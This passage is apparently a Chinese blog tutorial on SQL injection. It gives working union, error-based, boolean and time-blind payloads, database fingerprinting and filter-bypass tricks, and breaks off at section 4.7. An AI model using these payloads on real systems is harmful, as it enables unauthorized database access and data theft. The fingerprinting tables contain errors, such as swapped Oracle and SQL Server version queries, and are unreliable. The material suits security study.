    <content type="html"><![CDATA[<ul><li><a href="#1-%E5%8E%9F%E7%90%86--%E7%B1%BB%E5%9E%8B">1 原理 &amp; 类型</a><ul><li><a href="#11-sql-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86">1.1 SQL 注入原理</a></li><li><a href="#12-sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%8C%89%E6%8A%80%E5%B7%A7%E5%88%86%E7%B1%BB">1.2 SQL注入的类型(按技巧分类)</a></li></ul></li><li><a href="#2-%E6%A3%80%E6%B5%8B%E6%89%8B%E6%AE%B5">2 检测手段</a><ul><li><a href="#21-%E6%B3%A8%E5%85%A5%E7%82%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8--%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">2.1 注入点是否存在 &amp; 数据类型</a><ul><li><a href="#211-%E6%B7%BB%E5%8A%A0%E5%8D%95%E5%BC%95%E5%8F%B7">2.1.1 添加单引号</a></li><li><a href="#212-%E6%B7%BB%E5%8A%A0%E8%BF%90%E7%AE%97%E7%AC%A6">2.1.2 添加运算符</a></li></ul></li><li><a href="#22-%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B">2.2 注入类型</a><ul><li><a href="#221-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5">2.2.1 堆叠注入</a></li><li><a href="#222-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">2.2.2 报错注入</a><ul><li><a href="#2221-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">2.2.2.1 联合查询注入</a><ul><li><a href="#%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F%E5%88%A4%E6%96%AD">表的字段数量判断</a></li><li><a href="#%E6%98%BE%E7%A4%BA%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9%E5%88%A4%E6%96%AD">显示字段内容判断</a></li></ul></li><li><a href="#2222-group-by%E9%87%8D%E5%A4%8D%E5%BB%BA%E5%86%B2%E7%AA%81%E6%8A%A5%E9%94%99">2.2.2.2 group by重复建冲突报错</a></li><li><a href="#2223-xpath%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF">2.2.2.3 xpath语法错误</a></li></ul></li><li><a href="#223-%E7%9B%B2%E6%B3%A8">2.2.3 盲注</a><ul><li><a href="#2231-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">2.2.3.1 布尔盲注</a><ul><li><a href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6">判断数据库名长度</a></li><li><a href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">判断数据库名</a></li></ul></li><li><a href="#2232-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">2.2.3.2 时间盲注</a></li></ul></li></ul></li></ul></li><li><a href="#3-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A4%E6%96%AD">3 数据库判断</a><ul><li><a href="#31-%E5%B8%B8%E8%A7%81%E5%89%8D%E7%AB%AF%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E5%8C%B9%E9%85%8D">3.1 常见前端与数据库类型匹配</a></li><li><a href="#32-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E5%BF%97%E6%80%A7%E4%BF%A1%E6%81%AF">3.2 数据库标志性信息</a></li><li><a href="#33-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F">3.3 字符串处理方式</a></li><li><a href="#34-%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E4%B8%8E%E6%B3%A8%E9%87%8A">3.4 特殊符号与注释</a></li></ul></li><li><a href="#4-%E7%BB%95%E8%BF%87">4 绕过</a><ul><li><a href="#41-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4">4.1 关键字过滤</a></li><li><a href="#42-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4">4.2 空格过滤</a></li><li><a href="#43-%E9%80%97%E5%8F%B7%E8%BF%87%E6%BB%A4%E6%8B%A6%E6%88%AA">4.3 逗号过滤&#x2F;拦截</a></li><li><a href="#44-%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8B%A6%E6%88%AA%E8%BF%87%E6%BB%A4%E8%BD%AC%E4%B9%89">4.4 单引号拦截&#x2F;过滤&#x2F;转义</a><ul><li><a href="#441-%E5%88%A9%E7%94%A8%E7%BC%96%E7%A0%81%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">4.4.1 利用编码特性绕过。（宽字节注入）</a></li><li><a href="#442-%E5%88%A9%E7%94%A8%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87">4.4.2 利用反斜杠\绕过</a></li><li><a href="#443-%E5%B0%86-utf-8-%E8%BD%AC%E6%8D%A2%E4%B8%BA-utf-16-%E6%88%96-utf-32">4.4.3 将 utf-8 转换为 utf-16 或 utf-32</a></li></ul></li><li><a href="#45-%E6%95%B0%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87">4.5 数字被过滤&#x2F;拦截绕过</a></li><li><a href="#46-%E7%AD%89%E5%8F%B7%E8%BF%87%E6%BB%A4">4.6 等号过滤</a></li><li><a href="#47-%E5%85%B6%E4%BB%96%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87">4.7 其他关键字过滤&#x2F;拦截绕过</a></li></ul></li><li><a href="#%E5%8F%82%E8%80%83%E5%86%85%E5%AE%B9">参考内容</a></li></ul><h1 id="1-原理-amp-类型"><a href="#1-原理-amp-类型" class="headerlink" title="1 原理 &amp; 类型"></a>1 原理 &amp; 类型</h1><h2 id="1-1-SQL-注入原理"><a href="#1-1-SQL-注入原理" class="headerlink" title="1.1 SQL 注入原理"></a>1.1 SQL 注入原理</h2><p>基本的SQL查询语句如下所示，其中 <code>$id</code> 为提交的变量，当这个参数没有做非常严格的过滤，通过对 <code>$id</code> 的构造，数据库能输出攻击者想要获取的内容，就造成了SQL注入的漏洞。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$id&#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p>Tips: <code>$id</code> 参数可能存在于任何参数传递的位置：</p><ul><li>GET&#x2F;POST&#x2F;PUT&#x2F;DELETE 参数</li><li>X-Forwarded-For(详细内容待补充)</li><li>查询、搜索</li><li>页码、选择菜单</li><li>账号、密码</li><li>文件名</li></ul></blockquote><h2 id="1-2-SQL注入的类型-按技巧分类"><a href="#1-2-SQL注入的类型-按技巧分类" class="headerlink" title="1.2 SQL注入的类型(按技巧分类)"></a>1.2 SQL注入的类型(按技巧分类)</h2><ul><li>盲注<ul><li>布尔盲注：只能从应用返回中推断语句执行后的布尔值</li><li>时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断</li></ul></li><li>报错注入：应用会显示全部或者部分的报错信息</li><li>堆叠注入：有的应用可以加入 ; 后一次执行多条语句</li><li>联合查询注入：</li></ul><h1 id="2-检测手段"><a href="#2-检测手段" class="headerlink" title="2 检测手段"></a>2 检测手段</h1><h2 id="2-1-注入点是否存在-amp-数据类型"><a href="#2-1-注入点是否存在-amp-数据类型" class="headerlink" title="2.1 注入点是否存在 &amp; 数据类型"></a>2.1 注入点是否存在 &amp; 数据类型</h2><h3 id="2-1-1-添加单引号"><a href="#2-1-1-添加单引号" class="headerlink" title="2.1.1 添加单引号"></a>2.1.1 添加单引号</h3><p>修改参数 <code>$id</code> 的值，在其中加入单引号，将SQL查询内容不闭合，如下所示，页面可能会显示部分或者全部数据库报错内容(如果没有被过滤)，则存在注入点，且注入类型为字符型。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$id&#x27;&#x27; LIMIT 0,1</span><br></code></pre></td></tr></table></figure><h3 id="2-1-2-添加运算符"><a href="#2-1-2-添加运算符" class="headerlink" title="2.1.2 添加运算符"></a>2.1.2 添加运算符</h3><p>传入的参数并没有显示在报错信息中，则传入的参数前面可能没有引号包裹，于是注入的类型可能是数字型。可以通过在id后添加运算符，如-1，+2，来观察页面的内容是否会变成对应的 id 来判断是否存在注入点，此时注入类型为数字型。</p><p>如下所示，将id变为1+1，+号在URL中会被编码为空格，所以我们需要提前将+号进行URL编码，变为：%2b</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1+1&#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1%2b1&#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><h2 id="2-2-注入类型"><a href="#2-2-注入类型" class="headerlink" title="2.2 注入类型"></a>2.2 注入类型</h2><h3 id="2-2-1-堆叠注入"><a href="#2-2-1-堆叠注入" class="headerlink" title="2.2.1 堆叠注入"></a>2.2.1 堆叠注入</h3><p>分号 <code>;</code> 在sql中意味着一条语句的结束，可以在分号后继续构造第二条语句，数据库依然会继续执行，这样就会存在堆叠注入。</p><blockquote><p>Tips: 堆叠注入存在局限性</p><ol><li>结果不会在页面显示</li><li>接口或者数据库引擎不支持</li></ol></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span>;<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,database(),version(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h3 id="2-2-2-报错注入"><a href="#2-2-2-报错注入" class="headerlink" title="2.2.2 报错注入"></a>2.2.2 报错注入</h3><h4 id="2-2-2-1-联合查询注入"><a href="#2-2-2-1-联合查询注入" class="headerlink" title="2.2.2.1 联合查询注入"></a>2.2.2.1 联合查询注入</h4><h5 id="表的字段数量判断"><a href="#表的字段数量判断" class="headerlink" title="表的字段数量判断"></a>表的字段数量判断</h5><p>在mysql、mariadb、oracle等数据库中，可以使用数字来代替对应字段(列)的名称，如果数据库中没有对应的字段(列)，就会报错。使用 order by 让 <code>$id</code> 按照不同的字段排序，直到 order by 后的数字超出了字段数量，则会返回报错信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-comment">--+ LIMIT 0,1;</span><br></code></pre></td></tr></table></figure><h5 id="显示字段内容判断"><a href="#显示字段内容判断" class="headerlink" title="显示字段内容判断"></a>显示字段内容判断</h5><p>union 联合查询时，当前面的语句为假，则后面的查询结果会显示到相应的位置。则可以通过在前面查询语句中添加 and 1&#x3D;2 使语句变假，来判断页面显示的内容为表中的哪几个字段。然后使用database()和version()替换相应的字段位置就可以查询数据库名称和版本号。 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">--+ LIMIT 0,1;</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">--+ LIMIT 0,1;</span><br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,database(),version(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="2-2-2-2-group-by重复建冲突报错"><a href="#2-2-2-2-group-by重复建冲突报错" class="headerlink" title="2.2.2.2 group by重复建冲突报错"></a>2.2.2.2 group by重复建冲突报错</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">and</span> (<br>    <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<br>        <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<br>            (<br>                <span class="hljs-keyword">select</span> database() <span class="hljs-keyword">from</span> information_schema.tables limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>  <span class="hljs-comment">--+ 真正的查询语句</span><br>            ),<span class="hljs-built_in">floor</span>(rand()<span class="hljs-operator">*</span><span class="hljs-number">2</span>)<br>        )x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br>    )a<br>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="2-2-2-3-xpath语法错误"><a href="#2-2-2-3-xpath语法错误" class="headerlink" title="2.2.2.3 xpath语法错误"></a>2.2.2.3 xpath语法错误</h4><p>xpath 语法报错注入，主要利用extractvalue()和updatexml()函数。  </p><p>使用方法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(<br>    <span class="hljs-keyword">select</span> database()  <span class="hljs-comment">--+ 真正的查询语句</span><br>    ),<span class="hljs-string">&#x27;^&#x27;</span>)) <span class="hljs-comment">--+</span><br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(<br>    <span class="hljs-keyword">select</span> database()  <span class="hljs-comment">--+ 真正的查询语句</span><br>    ),<span class="hljs-string">&#x27;^&#x27;</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="2-2-3-盲注"><a href="#2-2-3-盲注" class="headerlink" title="2.2.3 盲注"></a>2.2.3 盲注</h3><h4 id="2-2-3-1-布尔盲注"><a href="#2-2-3-1-布尔盲注" class="headerlink" title="2.2.3.1 布尔盲注"></a>2.2.3.1 布尔盲注</h4><h5 id="判断数据库名长度"><a href="#判断数据库名长度" class="headerlink" title="判断数据库名长度"></a>判断数据库名长度</h5><p>改变length(database())&#x3D;的数值，当条件为真时，页面就会正常显示</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">and</span> length(database())<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h5 id="判断数据库名"><a href="#判断数据库名" class="headerlink" title="判断数据库名"></a>判断数据库名</h5><p>使用 sbustr 函数一位一位截取数据库名，如果为真，则页面正常显示</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">and</span> substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="2-2-3-2-时间盲注"><a href="#2-2-3-2-时间盲注" class="headerlink" title="2.2.3.2 时间盲注"></a>2.2.3.2 时间盲注</h4><p>当页面没有布尔状态时，可以通过观察页面响应时间是否变长来判断输入的条件是否正确。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-comment">-- +&#x27; LIMIT 0,1;</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> if((length(database())<span class="hljs-operator">=</span><span class="hljs-number">8</span>),sleep(<span class="hljs-number">10</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> if((substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;s&#x27;</span>),sleep(<span class="hljs-number">10</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h1 id="3-数据库判断"><a href="#3-数据库判断" class="headerlink" title="3 数据库判断"></a>3 数据库判断</h1><h2 id="3-1-常见前端与数据库类型匹配"><a href="#3-1-常见前端与数据库类型匹配" class="headerlink" title="3.1 常见前端与数据库类型匹配"></a>3.1 常见前端与数据库类型匹配</h2><table><thead><tr><th>前端语言</th><th>数据库</th></tr></thead><tbody><tr><td>sap</td><td>sql server，Access</td></tr><tr><td>.net</td><td>sql server</td></tr><tr><td>php</td><td>PostgreSQL, Mysql</td></tr><tr><td>java</td><td>mysql, oracle</td></tr></tbody></table><h2 id="3-2-数据库标志性信息"><a href="#3-2-数据库标志性信息" class="headerlink" title="3.2 数据库标志性信息"></a>3.2 数据库标志性信息</h2><table><thead><tr><th>数据库</th><th>信息查询</th></tr></thead><tbody><tr><td>oracle</td><td>select@@version –</td></tr><tr><td>sql server</td><td>select banner from v$version</td></tr><tr><td>mysql</td><td>select @@version, version() –, lenth(user)&gt;0</td></tr><tr><td>postgreSQL</td><td>select version() –</td></tr></tbody></table><h2 id="3-3-字符串处理方式"><a href="#3-3-字符串处理方式" class="headerlink" title="3.3 字符串处理方式"></a>3.3 字符串处理方式</h2><table><thead><tr><th>数据库</th><th>处理方式</th></tr></thead><tbody><tr><td>sql server</td><td>id&#x3D;1 and ‘a’+’b’&#x3D;’ab’ –</td></tr><tr><td>mssql</td><td>id&#x3D;1 and ‘a’+’b’&#x3D;’ab’</td></tr><tr><td>mysql</td><td>id&#x3D;1 and ‘a’+’b’&#x3D;’ab’, ‘ab’&#x3D;concat(‘a’,’b’)</td></tr><tr><td>oracle</td><td>id&#x3D;1 and ‘a’+’b’&#x3D;’a’||’b’, ‘ab’&#x3D;concat(‘a’,’b’)</td></tr><tr><td>postgresql</td><td>id&#x3D;1 and ‘a’+’b’&#x3D;’a’||’b’, ‘ab’&#x3D;concat(‘a’,’b’)</td></tr></tbody></table><h2 id="3-4-特殊符号与注释"><a href="#3-4-特殊符号与注释" class="headerlink" title="3.4 特殊符号与注释"></a>3.4 特殊符号与注释</h2><ol><li>null 和 %00 是Access支持的注释。</li><li># 是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’– ‘,和&#x2F;* *&#x2F;注释（注意mysql使用– 时需要后面添加空格）</li><li>– 和 &#x2F;* *&#x2F; 是Oracle，SQL server和MSSQL支持的注释符，如果正常，说明可能就是这仨了。</li><li>; 是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and exists (select count(*) from sysobjects) &gt;0 正常，就是MSSQL数据库</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> msysobjects) <span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> 两条都不正常，是Access数据库<br></code></pre></td></tr></table></figure><h1 id="4-绕过"><a href="#4-绕过" class="headerlink" title="4 绕过"></a>4 绕过</h1><h2 id="4-1-关键字过滤"><a href="#4-1-关键字过滤" class="headerlink" title="4.1 关键字过滤"></a>4.1 关键字过滤</h2><ul><li>第一种是替换关键字，这种方式可以直接通过双写关键词等方式来进行绕过；</li><li>第二种是关键词直接拦截，这种情况下可以通过变换函数等方式来进行绕过。</li></ul><h2 id="4-2-空格过滤"><a href="#4-2-空格过滤" class="headerlink" title="4.2 空格过滤"></a>4.2 空格过滤</h2><ul><li>使用&#x2F;**&#x2F;即SQL语句中的注释语句来绕过。</li><li>使用双写URL编码绕过，例如(%20 → %2%200)。</li><li>通过特殊符号（反引号、加号、括号等等），绕过空格。（在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。）</li><li>通过科学计数法绕过：where id&#x3D;0e1union select 1,2</li><li>Fuzz所有字符，查找可替代空格的字符例如 %09 %0a %0b %0c %0d。</li></ul><table><thead><tr><th>URL编码</th><th>符号</th></tr></thead><tbody><tr><td>%09</td><td>TAB 键（水平）</td></tr><tr><td>%0a</td><td>新建一行</td></tr><tr><td>%0c</td><td>新的一页</td></tr><tr><td>%0d</td><td>return 功能</td></tr><tr><td>%0b</td><td>TAB 键（垂直）</td></tr><tr><td>%a0</td><td>空格</td></tr></tbody></table><table><thead><tr><th>数据库</th><th>空白字符</th></tr></thead><tbody><tr><td>SQLite3</td><td>0A 0D 0C 09 20</td></tr><tr><td>MYSQL5</td><td>09 0A 0B 0C 0D A0 20</td></tr><tr><td>PosgresSQL</td><td>0A 0D 0C 09 20</td></tr><tr><td>Oracle 11g</td><td>00 0A 0D 0C 09 20</td></tr><tr><td>MSSQL</td><td>01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20</td></tr></tbody></table><h2 id="4-3-逗号过滤-x2F-拦截"><a href="#4-3-逗号过滤-x2F-拦截" class="headerlink" title="4.3 逗号过滤&#x2F;拦截"></a>4.3 逗号过滤&#x2F;拦截</h2><p>拦截逗号后，意味着大部分的联合查询注入都失效，这个时候可以尝试进行盲注。</p><p>substring和if语句都用到了逗号，因此无法使用。</p><p>substring可以用substr()函数来进行代替，if语句可以通过and语句来进行代替。</p><h2 id="4-4-单引号拦截-x2F-过滤-x2F-转义"><a href="#4-4-单引号拦截-x2F-过滤-x2F-转义" class="headerlink" title="4.4 单引号拦截&#x2F;过滤&#x2F;转义"></a>4.4 单引号拦截&#x2F;过滤&#x2F;转义</h2><p>当引号存在过滤和转义的情况下，可以这样处理：</p><h3 id="4-4-1-利用编码特性绕过。（宽字节注入）"><a href="#4-4-1-利用编码特性绕过。（宽字节注入）" class="headerlink" title="4.4.1 利用编码特性绕过。（宽字节注入）"></a>4.4.1 利用编码特性绕过。（宽字节注入）</h3><p>比较典型的使用编码就是GBK编码：使用前面的字符吃掉后面的字符(斜杆)。</p><p>待补充</p><h3 id="4-4-2-利用反斜杠-绕过"><a href="#4-4-2-利用反斜杠-绕过" class="headerlink" title="4.4.2 利用反斜杠\绕过"></a>4.4.2 利用反斜杠\绕过</h3><p>待补充</p><h3 id="4-4-3-将-utf-8-转换为-utf-16-或-utf-32"><a href="#4-4-3-将-utf-8-转换为-utf-16-或-utf-32" class="headerlink" title="4.4.3 将 utf-8 转换为 utf-16 或 utf-32"></a>4.4.3 将 utf-8 转换为 utf-16 或 utf-32</h3><p>待补充</p><h2 id="4-5-数字被过滤-x2F-拦截绕过"><a href="#4-5-数字被过滤-x2F-拦截绕过" class="headerlink" title="4.5 数字被过滤&#x2F;拦截绕过"></a>4.5 数字被过滤&#x2F;拦截绕过</h2><p>数字被屏蔽时，用响应函数结果来构造。</p><ul><li>ceil() ：为向上取整函数</li><li>floor()：为向下取整函数</li><li>! ~~：起到取反的效果</li><li>pi() ：π值</li><li>version()：利用当前版本号进行数字的构造</li><li>false：值为0</li><li>true：值为1</li></ul><h2 id="4-6-等号过滤"><a href="#4-6-等号过滤" class="headerlink" title="4.6 等号过滤"></a>4.6 等号过滤</h2><ul><li>当等于号&#x3D;呗过滤时，可以使用：like,in 等字符替换</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; IN (&#x27;</span><span class="hljs-number">1234</span><span class="hljs-string">&#x27;)#</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">like</span> <span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><h2 id="4-7-其他关键字过滤-x2F-拦截绕过"><a href="#4-7-其他关键字过滤-x2F-拦截绕过" class="headerlink" title="4.7 其他关键字过滤&#x2F;拦截绕过"></a>4.7 